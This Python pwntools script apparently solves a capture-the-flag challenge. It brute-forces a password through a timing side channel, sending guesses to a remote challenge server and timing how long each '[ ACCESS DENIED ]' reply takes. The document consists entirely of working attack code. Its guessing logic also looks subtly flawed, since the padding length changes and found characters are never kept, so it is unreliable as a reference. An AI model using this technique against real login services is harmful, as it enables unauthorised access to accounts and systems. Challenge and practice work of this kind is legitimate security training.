from pwn import *
import string
from warnings import filterwarnings

filterwarnings("ignore")
context.log_level = 'info'
charset = list(string.printable)

known_char = 'WizardsAndKnightsA'
password = known_char + 'a' * 32
delay = 0

while True:
    print(f"Trying password: {password}")
    sleep(1)
    io = remote('0.cloud.chals.io', '27650')
    # io = remote('localhost', '1339')
    info(f"Password: {password}")

    io.recvuntil('password?')
    before = time.time()

    io.sendline(password)
    io.recvuntil('[ ACCESS DENIED ]')

    after = time.time()
    current_delay = after - before
    print(f"Current delay: {current_delay}")

    if current_delay <= delay:
        password = known_char + charset[charset.index(password[18]) + 1] + 'a' * 15
    else:
        delay = current_delay

    io.close()
